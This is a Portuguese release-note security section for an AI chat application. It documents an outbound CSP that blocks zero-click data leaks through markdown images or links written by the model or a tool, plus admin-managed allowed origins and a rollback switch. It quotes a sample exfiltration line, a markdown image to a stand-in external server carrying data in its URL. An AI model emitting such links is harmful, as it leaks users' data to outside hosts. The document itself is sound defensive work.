### Security

- **CSP de saída aplicada por padrão (correção do vazamento de dados por imagem/link sem clique, T2).** O cabeçalho
  `Content-Security-Policy` do app agora inclui `img-src`, `font-src`, `style-src`, `media-src`, `connect-src` e
  `frame-src`, além de `report-uri`/`report-to`: o navegador só carrega recursos do próprio app (mais `data:` e `blob:`),
  então `![x](https://servidor-externo/?d=<dados>)` escrito pelo modelo ou por uma ferramenta não faz mais a requisição.
  Os iframes de slides, documentos e previews herdam a mesma política. Violações bloqueadas chegam ao log
  `csp_violation` (disposição `enforce`).
- **Origens externas permitidas, sem redeploy.** Um admin lista origens `https` em `app_settings.external_asset_origins`
  (`GET`/`PUT /api/admin/egress/settings`, auditado como `egress.settings`; vale em até 15 s em todas as réplicas), e
  `EXTERNAL_ASSET_ORIGINS` no `app.yaml` define um piso. Elas abrem só imagens, fontes e estilos, nunca `connect-src`,
  `media-src` nem `frame-src`. O cabeçalho nunca espera o banco: usa o valor em cache (ou o piso do ambiente) e mantém o
  último valor bom se a leitura falhar. `/api/me` devolve `externalAssetOrigins`.
- **Como reverter.** `CSP_EGRESS=report` no `app.yaml` (mesmo build, novo deploy) tira as diretivas de saída do cabeçalho
  aplicado; só o Report-Only observa. Um design system que dependa de fonte ou imagem remota deve ter a origem liberada por
  um admin. O `client/dist` será reconstruído na release 2.0.0 (o link do Google Fonts no `index.html` publicado seria
  bloqueado por `style-src`/`font-src`).
